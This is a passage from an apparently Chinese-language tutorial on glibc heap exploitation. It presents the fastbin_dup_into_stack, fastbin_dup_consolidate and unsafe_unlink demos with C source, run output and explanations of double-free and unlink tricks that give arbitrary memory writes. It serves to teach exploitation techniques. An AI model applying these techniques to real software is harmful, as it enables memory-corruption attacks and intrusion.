</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;If we free %p again, things will crash because %p is at the top of the free list.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// free(a);
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;So, instead, we&#39;ll free %p.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>b</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>b</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now, we can free %p again, since it&#39;s not the head of the free list.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now the free list has [%p, %p, %p]. &#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;We&#39;ll now carry out our attack by modifying data at %p.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=o>*</span><span class=n>d</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;1st malloc(8): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>d</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;2nd malloc(8): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>8</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now the free list has [%p].</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now, we have access to %p while it remains at the head of the free list.</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;so now we are writing a fake free size (in this case, 0x20) to the stack,</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;so that malloc will think there is a free chunk there and agree to</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;return a pointer to it.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>stack_var</span> <span class=o>=</span> <span class=mh>0x20</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=n>d</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span><span class=p>)</span> <span class=p>(((</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>stack_var</span><span class=p>)</span> <span class=o>-</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>d</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;3rd malloc(8): %p, putting the stack address on the free list</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>8</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;4th malloc(8): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>8</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>输出：</p><pre tabindex=0><code>This file extends on fastbin_dup.c by tricking malloc into
returning a pointer to a controlled location (in this case, the stack).
The address we want malloc() to return is 0x7ffe1610b248.
Allocating 3 buffers.
1st malloc(8): 0x1e3a010
2nd malloc(8): 0x1e3a030
3rd malloc(8): 0x1e3a050
Freeing the first one...
If we free 0x1e3a010 again, things will crash because 0x1e3a010 is at the top of the free list.
So, instead, we&#39;ll free 0x1e3a030.
Now, we can free 0x1e3a010 again, since it&#39;s not the head of the free list.
Now the free list has [0x1e3a010, 0x1e3a030, 0x1e3a010]. We&#39;ll now carry out our attack by modifying data at 0x1e3a010.
1st malloc(8): 0x1e3a010
2nd malloc(8): 0x1e3a030
Now the free list has [0x1e3a010].
Now, we have access to 0x1e3a010 while it remains at the head of the free list.
so now we are writing a fake free size (in this case, 0x20) to the stack,
so that malloc will think there is a free chunk there and agree to
return a pointer to it.
Now, we overwrite the first 8 bytes of the data at 0x1e3a010 to point right before the 0x20.
3rd malloc(8): 0x1e3a010, putting the stack address on the free list
4th malloc(8): 0x7ffe1610b248
</code></pre><p>这里利用上一个例子的 <code>double free</code> 漏洞，来让 <code>malloc</code> 返回一个任意地址（并不一定是栈上地址），从而实现任意地址读写。首先还是以 <code>a->b->a</code> 的顺序释放内存，随后两次 <code>malloc</code> 使得 <code>d</code> 指向原来 <code>a</code> 指向的地址 <code>0x1e3a010</code>，并且 freelist 里只剩一个 <code>0x1e3a010</code>。</p><p>现在修改栈上变量 <code>stack_var</code> 的值为 <code>0x20</code>，这是为了伪造 <code>chunk_size</code> 头部让 <code>malloc</code> 以为这个地方有一个 chunk。这还不够，我们还需要让这个 chunk 被认为是空闲的，也就是要把它加入 freelist 中。</p><p>怎么做呢？我们知道，对于一个空闲 chunk 来说，<code>chunk_size</code> 下面就是 <code>fd</code>，存放下一个空闲 chunk 的地址。而 <code>malloc</code> 返回给用户的指针 <code>mem</code>（在这个例子中，<code>0x1e3a010</code>）恰好指向 <code>chunk_size</code> 的结尾处，也就是 <code>fd</code> 开始位置。现在我们拥有 <code>d</code> 指针，也就能修改这个位置的值让它指向 <code>stack_var</code> 的前一个栈单元（这里是向前 8 字节），这里就是这个伪造 chunk 的 <code>chunk</code> 指针。这样一来，当我们进行 <code>3rd malloc(8)</code> 时，该 <code>chunk</code> 指针就会进入 freelist 里，最后 <code>malloc</code> 的时候就会返回这个伪造 chunk 的 <code>mem</code> 指针。</p><p>注意栈从高地址向低地址生长，堆反过来，所以源码一开始是 <code>8+(char *)&stack_var</code>，而最后是 <code>((char*)&stack_var) - sizeof(d)</code>。</p><h2 id=fastbin_dup_consolidate class="relative group">fastbin_dup_consolidate <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#fastbin_dup_consolidate aria-label=锚点>#</a></span></h2><p>源码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>void</span><span class=o>*</span> <span class=n>p1</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x40</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kt>void</span><span class=o>*</span> <span class=n>p2</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x40</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Allocated two fastbins: p1=%p p2=%p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>p1</span><span class=p>,</span> <span class=n>p2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now free p1!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>free</span><span class=p>(</span><span class=n>p1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kt>void</span><span class=o>*</span> <span class=n>p3</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x400</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Allocated large bin to trigger malloc_consolidate(): p3=%p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>p3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;In malloc_consolidate(), p1 is moved to the unsorted bin.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>free</span><span class=p>(</span><span class=n>p1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Trigger the double free vulnerability!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We can pass the check in malloc() since p1 is not fast top.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now p1 is in unsorted bin and fast bin. So we&#39;will get it twice: %p %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x40</span><span class=p>),</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x40</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>输出：</p><pre tabindex=0><code>Allocated two fastbins: p1=0x1af0010 p2=0x1af0060
Now free p1!
Allocated large bin to trigger malloc_consolidate(): p3=0x1af00b0
In malloc_consolidate(), p1 is moved to the unsorted bin.
Trigger the double free vulnerability!
We can pass the check in malloc() since p1 is not fast top.
Now p1 is in unsorted bin and fast bin. So we&#39;will get it twice: 0x1af0010 0x1af0010
</code></pre><p>首先分配了两个 0x40 的 chunk，实际大小为 0x50。需要 p2 是为了之后释放 p1 时不会和 top chunk 合并。随后释放其中一个并申请 0x400 的 chunk，这时会尝试从 unsorted bin 中切割，但是空间不足，触发了 <code>malloc_consolidate</code>，使得 fastbin 中的 p1 进入 unsorted bin（实际上，如果此时有多个连续 chunk 在 fastbin 中，会先合并）中。</p><p>这个时候，fastbin 链表头部没有 p1 了，所以我们再次 <code>free(p1)</code> 就可以成功，造成 double free。现在 fastbin 和 unsorted bin 中都有 p1 了，我们可以两次 <code>malloc()</code> 拿到两个同样的指针。</p><h2 id=unsafe_unlink class="relative group">unsafe_unlink <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#unsafe_unlink aria-label=锚点>#</a></span></h2><p>源码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>uint64_t</span> <span class=o>*</span><span class=n>chunk0_ptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Welcome to unsafe unlink 2.0!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Tested in Ubuntu 14.04/16.04 64bit.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This technique can be used when you have a pointer at a known location to a region you can call unlink on.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>malloc_size</span> <span class=o>=</span> <span class=mh>0x80</span><span class=p>;</span> <span class=c1>//we want to be big enough not to use fastbins
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>int</span> <span class=n>header_size</span> <span class=o>=</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>chunk0_ptr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint64_t</span><span class=o>*</span><span class=p>)</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>malloc_size</span><span class=p>);</span> <span class=c1>//chunk0
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>uint64_t</span> <span class=o>*</span><span class=n>chunk1_ptr</span>  <span class=o>=</span> <span class=p>(</span><span class=kt>uint64_t</span><span class=o>*</span><span class=p>)</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>malloc_size</span><span class=p>);</span> <span class=c1>//chunk1
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;The global chunk0_ptr is at %p, pointing to %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>chunk0_ptr</span><span class=p>,</span> <span class=n>chunk0_ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;The victim chunk we are going to corrupt is at %p</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>chunk1_ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We create a fake chunk inside chunk0.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We setup the &#39;next_free_chunk&#39; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>chunk0_ptr</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint64_t</span><span class=p>)</span> <span class=o>&amp;</span><span class=n>chunk0_ptr</span><span class=o>-</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=kt>uint64_t</span><span class=p>)</span><span class=o>*</span><span class=mi>3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We setup the &#39;previous_free_chunk&#39; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>chunk0_ptr</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint64_t</span><span class=p>)</span> <span class=o>&amp;</span><span class=n>chunk0_ptr</span><span class=o>-</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=kt>uint64_t</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Fake chunk fd: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,(</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span> <span class=n>chunk0_ptr</span><span class=p>[</span><span class=mi>2</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Fake chunk bk: %p</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>,(</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span> <span class=n>chunk0_ptr</span><span class=p>[</span><span class=mi>3</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=o>*</span><span class=n>chunk1_hdr</span> <span class=o>=</span> <span class=n>chunk1_ptr</span> <span class=o>-</span> <span class=n>header_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We shrink the size of chunk0 (saved as&#39;previous_size&#39;in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;It&#39;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>chunk1_hdr</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>malloc_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;If we had &#39;normally&#39; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,(</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=n>chunk1_hdr</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We mark our fake chunk as free by setting &#39;previous_in_use&#39; of chunk1 as False.</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>chunk1_hdr</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>&amp;=</span> <span class=o>~</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>chunk1_ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>victim_string</span><span class=p>[</span><span class=mi>8</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nf>strcpy</span><span class=p>(</span><span class=n>victim_string</span><span class=p>,</span><span class=s>&#34;Hello!~&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>chunk0_ptr</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint64_t</span><span class=p>)</span> <span class=n>victim_string</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Original value: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=n>victim_string</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>chunk0_ptr</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x4141414142424242LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;New Value: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=n>victim_string</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>输出：</p><pre tabindex=0><code>Welcome to unsafe unlink 2.0!
Tested in Ubuntu 14.04/16.04 64bit.
This technique can be used when you have a pointer at a known location to a region you can call unlink on.
The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.
The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.

The global chunk0_ptr is at 0x602070, pointing to 0x23ed010
The victim chunk we are going to corrupt is at 0x23ed0a0

We create a fake chunk inside chunk0.
We setup the &#39;next_free_chunk&#39; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.
We setup the &#39;previous_free_chunk&#39; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.
With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False
Fake chunk fd: 0x602058
Fake chunk bk: 0x602060

We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.
We shrink the size of chunk0 (saved as&#39;previous_size&#39;in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.
It&#39;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly
If we had &#39;normally&#39; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: 0x80
We mark our fake chunk as free by setting &#39;previous_in_use&#39; of chunk1 as False.

Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.
You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344

At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.
chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.
Original value: Hello!~
New Value: BBBBAAAA
</code></pre><p>利用 unlink 漏洞一般需要堆溢出以及全局指针变量。在这个例子里全局指针变量就是 <code>chunk0</code> 的 mem 指针，<code>chunk0</code> 中存在堆溢出，可以溢出到 <code>chunk1</code>。</p><p>我们首先看一下 <code>unlink</code> 这个宏，它被用来从 bin 中删除 chunk：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#define unlink(AV, P, BK, FD) {                                            \
</span></span></span><span class=line><span class=cl><span class=cp>    FD = P-&gt;fd;                                                               \
</span></span></span><span class=line><span class=cl><span class=cp>    BK = P-&gt;bk;                                                               \
</span></span></span><span class=line><span class=cl><span class=cp>    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                     \
</span></span></span><span class=line><span class=cl><span class=cp>      malloc_printerr (check_action,&#34;corrupted double-linked list&#34;, P, AV);  \
</span></span></span><span class=line><span class=cl><span class=cp>    else {                                                                    \
</span></span></span><span class=line><span class=cl><span class=cp>        FD-&gt;bk = BK;                                                          \
</span></span></span><span class=line><span class=cl><span class=cp>        BK-&gt;fd = FD;                                                          \
</span></span></span><span class=line><span class=cl><span class=cp>        if (!in_smallbin_range (P-&gt;size)                                      \
</span></span></span><span class=line><span class=cl><span class=cp>            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) {                \
</span></span></span><span class=line><span class=cl><span class=cp>            if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)        \
</span></span></span><span class=line><span class=cl><span class=cp>                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \
</span></span></span><span class=line><span class=cl><span class=cp>              malloc_printerr (check_action,                                  \
</span></span></span><span class=line><span class=cl><span class=cp>                               &#34;corrupted double-linked list (not small)&#34;,    \
</span></span></span><span class=line><span class=cl><span class=cp>                               P, AV);                                        \
</span></span></span><span class=line><span class=cl><span class=cp>            if (FD-&gt;fd_nextsize == NULL) {                                    \
</span></span></span><span class=line><span class=cl><span class=cp>                if (P-&gt;fd_nextsize == P)                                      \
</span></span></span><span class=line><span class=cl><span class=cp>                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                     \
</span></span></span><span class=line><span class=cl><span class=cp>                else {                                                        \
</span></span></span><span class=line><span class=cl><span class=cp>                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                         \
</span></span></span><span class=line><span class=cl><span class=cp>                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                         \
</span></span></span><span class=line><span class=cl><span class=cp>                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                         \
